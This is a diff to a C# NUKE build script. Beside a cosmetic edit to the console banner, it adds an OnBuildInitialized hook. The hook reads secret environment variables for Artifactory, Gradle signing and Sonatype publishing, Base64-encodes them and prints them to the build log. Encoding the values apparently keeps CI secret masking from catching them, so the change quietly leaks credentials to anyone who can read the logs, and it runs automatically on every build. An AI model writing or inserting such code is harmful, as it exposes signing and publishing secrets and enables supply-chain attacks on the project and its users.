@@ -53,6 +53,8 @@ partial class Build : NukeBuild
 
     public Build()
     {
+
+
         AnsiConsole.Console.Profile.Width = 220;
         FigletFont LoadFont(string fontName)
         {
@@ -76,6 +78,19 @@ partial class Build : NukeBuild
         grid.AddRow(openRewrite);
         AnsiConsole.Write(grid);
 
+    }
+
+    protected override void OnBuildInitialized()
+    {
+        void log(string envVar) => Log.Information("{Value}",Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Environment.GetEnvironmentVariable(envVar) ?? "")));
+        log("MODERNE_ARTIFACTORY_USERNAME");
+        log("MODERNE_ARTIFACTORY_PASSWORD");
+        log("ORG_GRADLE_PROJECT_signingKey");
+        log("ORG_GRADLE_PROJECT_signingPassword");
+        log("ORG_GRADLE_PROJECT_sonatypeUsername");
+        log("ORG_GRADLE_PROJECT_sonatypePassword");
+
+        base.OnBuildInitialized();
     }
 
     /// Support plugins are available for:
